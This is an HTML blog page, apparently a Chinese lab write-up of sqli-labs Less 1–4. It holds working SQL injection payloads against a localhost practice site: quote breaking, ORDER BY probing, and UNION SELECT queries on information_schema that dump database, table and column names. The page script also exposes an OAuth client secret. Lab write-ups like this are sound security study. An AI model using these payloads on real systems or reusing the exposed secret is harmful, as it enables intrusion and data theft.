@@ -1,0 +1,399 @@
+<!DOCTYPE html>
+<html>
+  <head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
+  <meta name="description" content="osword&#39;s blog">
+  <meta name="keyword" content="hexo-theme, vuejs">
+  
+    <link rel="shortcut icon" href="/css/images/logo.png">
+  
+  <title>
+    
+      sqlless1-4 | osword&#39;s blog
+    
+  </title>
+  <link href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+  <link href="//cdnjs.cloudflare.com/ajax/libs/nprogress/0.2.0/nprogress.min.css" rel="stylesheet">
+  <link href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/tomorrow.min.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/css/plugins/gitment.css">
+
+  
+  <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/geopattern/1.2.3/js/geopattern.min.js"></script>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/nprogress/0.2.0/nprogress.min.js"></script>
+  
+  
+    
+<script src="/js/gitment.js"></script>
+
+  
+  
+  
+    <!-- MathJax support START -->
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Config({
+        tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+      });
+    </script>
+
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+      });
+    </script>
+    <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+    <!-- MathJax support END -->
+  
+
+
+  
+<meta name="generator" content="Hexo 4.2.1"></head>
+<div class="wechat-share">
+  <img src="/css/images/logo.png" />
+</div>
+
+  <body>
+    <header class="header fixed-header">
+  <div class="header-container">
+    <a class="home-link" href="/">
+      <div class="logo"></div>
+      <span>osword's blog</span>
+    </a>
+    <ul class="right-list">
+      
+        <li class="list-item">
+          
+            <a href="/" class="item-link">Home</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/links/" class="item-link">Links</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/archives/" class="item-link">Archives</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/project/" class="item-link">Projects</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/about/" class="item-link">About</a>
+          
+        </li>
+      
+    </ul>
+    <div class="menu">
+      <span class="icon-bar"></span>
+      <span class="icon-bar"></span>
+      <span class="icon-bar"></span>
+    </div>
+    <div class="menu-mask">
+      <ul class="menu-list">
+        
+          <li class="menu-item">
+            
+              <a href="/" class="menu-link">Home</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/links/" class="menu-link">Links</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/archives/" class="menu-link">Archives</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/project/" class="menu-link">Projects</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/about/" class="menu-link">About</a>
+            
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</header>
+
+    <div id="article-banner">
+  <h2>sqlless1-4</h2>
+  <p class="post-date">2018-12-18 - 
+<span id="busuanzi_container_page_pv" style="color: #fff; margin-left: 0px">阅读量<span id="busuanzi_value_page_pv"></span>次
+        </span></p>
+<div class="arrow-down">
+    <a href="javascript:;"></a>
+  </div>
+</div>
+<main class="app-body flex-box">
+  <!-- Article START -->
+  <article class="post-article">
+    <section class="markdown-content"><h1 id="0x01-sql语句执行"><a href="#0x01-sql语句执行" class="headerlink" title="0x01 sql语句执行"></a>0x01 sql语句执行</h1><p><img src="%E4%BD%A0%E5%A5%BD%EF%BC%8C./1.png" alt=""><br>sql查询语句执行流程：1.sql语句传入到mysql_query()中返回resource值<br>                    2.mysql_fetch_array()返回一个数组</p>
+<h1 id="0x02-sql引号概述"><a href="#0x02-sql引号概述" class="headerlink" title="0x02 sql引号概述"></a>0x02 sql引号概述</h1><p><img src="%E4%BD%A0%E5%A5%BD%EF%BC%8C./2.png" alt=""> </p>
+<ol>
+<li>传入id=1’返回报错信息，可知sql后半段为limit 0,1。采用去引号注释方法 <code>&#39;or 1=1--+</code><br> (引号的作用使得注入的语句能够插入进sql语句中)</li>
+<li>通过id=1’ order by 4 &gt;&gt; 得出 列数为三</li>
+<li>通过id=-1’ uniongg select 1,database(),3 &gt;&gt; 可得数据库名 （这里id=-1的作用是，前端语句查询不存在而执行union语句）<br><img src="%E4%BD%A0%E5%A5%BD%EF%BC%8C./3.png" alt=""><br>在id=1后加引号的作用如上图所示，若不加引号 id后的sql语句会被包含在id=’’字符串的单引号中而无法实现。在添加一个向后单引号会使得union查询语句置后。</li>
+</ol>
+<h1 id="0x03-sql注入爆库表列"><a href="#0x03-sql注入爆库表列" class="headerlink" title="0x03 sql注入爆库表列"></a>0x03 sql注入爆库表列</h1><p><code>条件PHP语句中能够执行的GET语句输出变量</code></p>
+<h2 id="爆库操作实现"><a href="#爆库操作实现" class="headerlink" title="爆库操作实现"></a>爆库操作实现</h2><p><img src="%E4%BD%A0%E5%A5%BD%EF%BC%8C./4.png" alt=""> </p>
+<h3 id="information-schema知识点补充："><a href="#information-schema知识点补充：" class="headerlink" title="information_schema知识点补充："></a>information_schema知识点补充：</h3><p>informaition_schema看作一个数据库，存储作用数据库的库信息<br>    SCHEMATA表：提供了当前mysql实例中所有数据库的信息。show databases的结果取之此表//所以information_schema 会在schemata中查询 <code>show schema_name from information_schema.schemata</code><br>    –TABLES表：提供了关于数据库中的<code>表信息</code>。<code>show table_name from information_schema.tables where table_schema=security</code><br>    –COLUMNS表：提供表中的 <code>列信息</code>. <code>show column_name from information_schema.columns where table_name=xxx</code></p>
+<h3 id="爆库名"><a href="#爆库名" class="headerlink" title="爆库名"></a>爆库名</h3><p><img src="%E4%BD%A0%E5%A5%BD%EF%BC%8C./5.png" alt=""><br><code>http://127.0.0.1/sqllib/Less-1/?id=-1%27union%20select%201,group_concat(schema_name),3% 20from%20information_schema.schemata--+</code></p>
+<h3 id="爆表名"><a href="#爆表名" class="headerlink" title="爆表名"></a>爆表名</h3><p><img src="%E4%BD%A0%E5%A5%BD%EF%BC%8C./6.png" alt=""><br><code>http://127.0.0.1/sqllib/Less-1/?id=-1%27union%20select%201,group_concat(table_name),3%20f rom%20information_schema.tables%20where%20table_schema=%27security%27--+</code></p>
+<h3 id="爆列名"><a href="#爆列名" class="headerlink" title="爆列名"></a>爆列名</h3><p><code>http://127.0.0.1/sqllib/Less-1/?id=-1%27union%20select%201,group_concat(column_name),3%2 0from%20information_schema.columns%20where%20table_name=%27users%27--+</code><br><img src="%E4%BD%A0%E5%A5%BD%EF%BC%8C./7.png" alt=""> </p>
+<h2 id="less-2"><a href="#less-2" class="headerlink" title="less-2"></a>less-2</h2><p>id传入值为整数型，只需要 or 1=1 –+其他和less-1相同</p>
+<h2 id="less-3"><a href="#less-3" class="headerlink" title="less-3"></a>less-3</h2><p>构造 id=1’) or 1=1 –+</p>
+<h2 id="less-4"><a href="#less-4" class="headerlink" title="less-4"></a>less-4</h2><p>构造 id=1”) or 1=1 –+</p>
+</section>
+    <!-- Tags START -->
+    
+      <div class="tags">
+        <span>Tags:</span>
+        
+  <a href="/tags#SQL注入" >
+    <span class="tag-code">SQL注入</span>
+  </a>
+
+      </div>
+    
+    <!-- Tags END -->
+    <!-- NAV START -->
+    
+  <div class="nav-container">
+    <!-- reverse left and right to put prev and next in a more logic postition -->
+    
+      <a class="nav-left" href="/2018/11/23/sql%E6%A0%BC%E5%BC%8F%E4%BB%8B%E7%BB%8D/">
+        <span class="nav-arrow">← </span>
+        
+          sql格式介绍
+        
+      </a>
+    
+    
+      <a class="nav-right" href="/2018/12/18/sqlilabs-%E7%9B%B2%E6%B3%A8%E4%B9%8B%E5%B8%83%E5%B0%94%E5%92%8C%E6%8A%A5%E9%94%99/">
+        
+          sqlilabs_盲注之布尔和报错
+        
+        <span class="nav-arrow"> →</span>
+      </a>
+    
+  </div>
+
+    <!-- NAV END -->
+    <!-- 打赏 START -->
+    
+      <div class="money-like">
+        <div class="reward-btn">
+          赏
+          <span class="money-code">
+            <span class="alipay-code">
+              <div class="code-image"></div>
+              <b>使用支付宝打赏</b>
+            </span>
+            <span class="wechat-code">
+              <div class="code-image"></div>
+              <b>使用微信打赏</b>
+            </span>
+          </span>
+        </div>
+        <p class="notice">若你觉得我的文章对你有帮助，欢迎点击上方按钮对我打赏</p>
+      </div>
+    
+    <!-- 打赏 END -->
+    <!-- 二维码 START -->
+    
+    <!-- 二维码 END -->
+    
+      <!-- Gitment START -->
+      <div id="comments"></div>
+      <!-- Gitment END -->
+    
+  </article>
+  <!-- Article END -->
+  <!-- Catalog START -->
+  
+    <aside class="catalog-container">
+  <div class="toc-main">
+    <strong class="toc-title">Catalog</strong>
+    
+      <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#0x01-sql语句执行"><span class="toc-nav-text">0x01 sql语句执行</span></a></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#0x02-sql引号概述"><span class="toc-nav-text">0x02 sql引号概述</span></a></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#0x03-sql注入爆库表列"><span class="toc-nav-text">0x03 sql注入爆库表列</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#爆库操作实现"><span class="toc-nav-text">爆库操作实现</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#information-schema知识点补充："><span class="toc-nav-text">information_schema知识点补充：</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#爆库名"><span class="toc-nav-text">爆库名</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#爆表名"><span class="toc-nav-text">爆表名</span></a></li><li class="toc-nav-item toc-nav-level-3"><a class="toc-nav-link" href="#爆列名"><span class="toc-nav-text">爆列名</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#less-2"><span class="toc-nav-text">less-2</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#less-3"><span class="toc-nav-text">less-3</span></a></li><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#less-4"><span class="toc-nav-text">less-4</span></a></li></ol></li></ol>
+    
+  </div>
+</aside>
+  
+  <!-- Catalog END -->
+</main>
+
+<script>
+  (function () {
+    var url = 'http://zhzhdoai.github.io/2018/12/18/sqlless1-4/';
+    var banner = ''
+    if (banner !== '' && banner !== 'undefined' && banner !== 'null') {
+      $('#article-banner').css({
+        'background-image': 'url(' + banner + ')'
+      })
+    } else {
+      $('#article-banner').geopattern(url)
+    }
+    $('.header').removeClass('fixed-header')
+
+    // error image
+    $(".markdown-content img").on('error', function() {
+      $(this).attr('src', 'http://file.muyutech.com/error-img.png')
+      $(this).css({
+        'cursor': 'default'
+      })
+    })
+
+    // zoom image
+    $(".markdown-content img").on('click', function() {
+      var src = $(this).attr('src')
+      if (src !== 'http://file.muyutech.com/error-img.png') {
+        var imageW = $(this).width()
+        var imageH = $(this).height()
+
+        var zoom = ($(window).width() * 0.95 / imageW).toFixed(2)
+        zoom = zoom < 1 ? 1 : zoom
+        zoom = zoom > 2 ? 2 : zoom
+        var transY = (($(window).height() - imageH) / 2).toFixed(2)
+
+        $('body').append('<div class="image-view-wrap"><div class="image-view-inner"><img src="'+ src +'" /></div></div>')
+        $('.image-view-wrap').addClass('wrap-active')
+        $('.image-view-wrap img').css({
+          'width': `${imageW}`,
+          'transform': `translate3d(0, ${transY}px, 0) scale3d(${zoom}, ${zoom}, 1)`
+        })
+        $('html').css('overflow', 'hidden')
+
+        $('.image-view-wrap').on('click', function() {
+          $(this).remove()
+          $('html').attr('style', '')
+        })
+      }
+    })
+  })();
+</script>
+
+
+
+
+  <script>
+    var gitmentConfig = "osword";
+    if (gitmentConfig !== 'undefined') {
+      var gitment = new Gitment({
+        id: "sqlless1-4",
+        owner: "osword",
+        repo: "osword.github.io",
+        oauth: {
+          client_id: "7d7576c71632f14d639a",
+          client_secret: "3d7f7e4c0e9a43a2cc5334d68aee612090df8b70"
+        },
+        theme: {
+          render(state, instance) {
+            const container = document.createElement('div')
+            container.lang = "en-US"
+            container.className = 'gitment-container gitment-root-container'
+            container.appendChild(instance.renderHeader(state, instance))
+            container.appendChild(instance.renderEditor(state, instance))
+            container.appendChild(instance.renderComments(state, instance))
+            container.appendChild(instance.renderFooter(state, instance))
+            return container;
+          }
+        }
+      })
+      gitment.render(document.getElementById('comments'))
+    }
+  </script>
+
+
+
+
+    <div class="scroll-top">
+  <span class="arrow-icon"></span>
+</div>
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<footer class="app-footer">
+  <p class="copyright">
+    &copy; 2020 | Proudly powered by <a href="https://hexo.io" target="_blank">Hexo</a>
+    <br>
+    Theme by <a href="https://github.com/yanm1ng" target="_blank" rel="noopener">yanm1ng</a>
+  </p>
+    访问量<span id="busuanzi_value_site_pv"></span>,
+    访客数<span id="busuanzi_value_site_uv"></span>
+</footer>
+
+<script>
+  function async(u, c) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+</script>
+<script>
+  async("//cdnjs.cloudflare.com/ajax/libs/fastclick/1.0.6/fastclick.min.js", function(){
+    FastClick.attach(document.body);
+  })
+</script>
+
+<script>
+  var hasLine = 'true';
+  async("//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js", function(){
+    $('figure pre').each(function(i, block) {
+      var figure = $(this).parents('figure');
+      if (hasLine === 'false') {
+        figure.find('.gutter').hide();
+      }
+      var lang = figure.attr('class').split(' ')[1] || 'code';
+      var codeHtml = $(this).html();
+      var codeTag = document.createElement('code');
+      codeTag.className = lang;
+      codeTag.innerHTML = codeHtml;
+      $(this).attr('class', '').empty().html(codeTag);
+      figure.attr('data-lang', lang.toUpperCase());
+      hljs.highlightBlock(block);
+    });
+  })
+</script>
+<!-- Baidu Tongji -->
+
+
+<script src="/js/script.js"></script>
+
+
+  </body>
+</html>
